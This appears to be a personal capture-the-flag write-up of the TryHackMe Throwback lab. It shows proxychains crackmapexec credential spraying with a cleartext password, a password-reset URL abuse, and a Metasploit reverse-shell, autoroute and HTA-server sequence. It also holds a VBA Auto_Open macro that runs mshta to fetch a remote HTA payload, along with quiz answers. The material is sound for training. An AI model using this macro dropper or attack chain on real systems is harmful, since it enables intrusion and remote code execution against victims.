# You're Five Minutes Late...
Continuing on from the last task I add a FoxyProxy proxy to the AttackBox then my box as I read that I have do crackmapexec again. One more connective nightmare ahead I got lunch and started rolling my head over the keyboard till the everthing was re-re-re-re-re-re-setup again. I feel like I have learnt alot from this, but it really cost my motivation. I am now certain that using both the openvpn proxy and the AttackBox causes this connectivity issue as the proxy uses the same address for tun0. Check out my [Archive](https://github.com/7RU7H/Archive) project that has new section on Metasploit.


```bash
proxychains crackmapexec smb 10.200.102.0/24 -u SQLService -d THROWBACK.local -p mysql337570


SMB         10.200.102.117  445    THROWBACK-DC01   [*] Windows 10.0 Build 17763 x64 (name:THROWBACK-DC01) (domain:THROWBACK.local) (signing:True) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.102.117:445 SMB         10.200.102.176  445    THROWBACK-TIME   [*] Windows 10.0 Build 17763 x64 (name:THROWBACK-TIME) (domain:THROWBACK.local) (signing:False) (SMBv1:False)
 ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.102.117:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.102.117:445  ...  OK
SMB         10.200.102.117  445    THROWBACK-DC01   [+] THROWBACK.local\SQLService:mysql337570 
[proxychains] Strict chain  ...  127.0.0.1:1080 [proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.102.176:445  ...  10.200.102.202:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.102.176:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.102.176:445  ...  OK
SMB         10.200.102.176  445    THROWBACK-TIME   [+] THROWBACK.local\SQLService:mysql337570
...
...
SMB         10.200.102.219  445    THROWBACK-PROD   [*] Windows 10.0 Build 17763 x64 (name:THROWBACK-PROD) (domain:THROWBACK.local) (signing:False) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.102.219:445  ...  OK
SMB         10.200.102.222  445    THROWBACK-WS01   [*] Windows 10.0 Build 19041 x64 (name:THROWBACK-WS01) (domain:THROWBACK.local) (signing:False) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.102.219:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.102.219:445  ...  OK
<--socket error or timeout!
SMB         10.200.102.219  445    THROWBACK-PROD   [+] THROWBACK.local\SQLService:mysql337570 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.102.222:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.102.222:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.102.222:445  ...  OK
<--socket error or timeout!
SMB         10.200.102.222  445    THROWBACK-WS01   [+] THROWBACK.local\SQLService:mysql337570 

```

I also ran another nmap scan and a smbmap through the the proxychains:
```bash
proxychains smbmap -u SQLservice -p mysql337570 -d THROWBACK.local -H 10.200.102.0/24
```


MurphyF has the email reset, make sure you have edited your /etc/hosts and use the foxyproxy to view the Throwback Hacks Timekeep
![MurphyF](5minuteMurphyFemail.png)

```txt
URL:

http://timekeep.throwback.local/dev/passwordreset.php?user=murphyf&password=PASSWORD
```


## Answers

What is the hostname of the device?  
```{toggle}
Throwback-TIME
```
What is the title of the web page?  
```{toggle}
Throwback Hacks Timekeep
```
What user was the password reset for?
```{toggle}
MurphyF
```



# Word to your Mother

```bash
proxychains curl "timekeep.throwback.local/dev/passwordreset.php?user=murphyf&password=PASSWORD"

use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost tun0
exploit -j

use post/multi/manage/autoroute
set session
set subnet 10.200.102.0
exploit

use auxiliary/server/socks_proxy
exploit -j

use exploit/windows/misc/hta_server
set payload windows/x64/meterpreter/reverse_tcp
set SRVHOST tun0
set lhost tun0
set lport 3333
set uripath pleasework.hta
exploit -j
```

Visual Basic Macro

```vb
Sub Hello()
	PID = Shell("mshta.exe http://IP:8080/pleasework.hta")
End Sub
	
Sub Auto_Open()
	Hello
End Sub
```

Turned on Firefox proxy, went to `http://timekeep.throwback.local/` entered murphyf:PASSWORD, uploaded the Timesheet.xlsm. **BUT**

```msconsole
[*] 10.200.102.176   hta_server - Delivering Payload
BUT NO shell...
```

I decided to let it run in the background as maybe it would spawn. I have one day of access left finish Throwback. Deciding that although the support at THM discord is great probably do not have the time to wait. Presuming that most networks don't have nice file upload to RCE and given I have the SQLservice password through proxychain crackmapexec. I read [0xkaram's](https://0xkaram.github.io/posts/Try-Hack-Me-Throwback-Write-Up/#6-throwback-prod--10200154219) I got to the `ipconfig /displaydns`, decide not to break to look up panic and scroll futher.  Here are the asnwers for this section. 
## Answers

What web server accepts XLSMs as a file upload?
```{toggle}
THROWBACK-Time
```
What page is the file upload in?  
```{toggle}
Timesheet.php
```
What is the name of the XLSMs that you can upload?
```{toggle}
Timesheet.xlsm
```

# To be continued...

Due to the fact that my RCE did not land and time, I decided to rush off-piste and try do this from now on off the rails. 



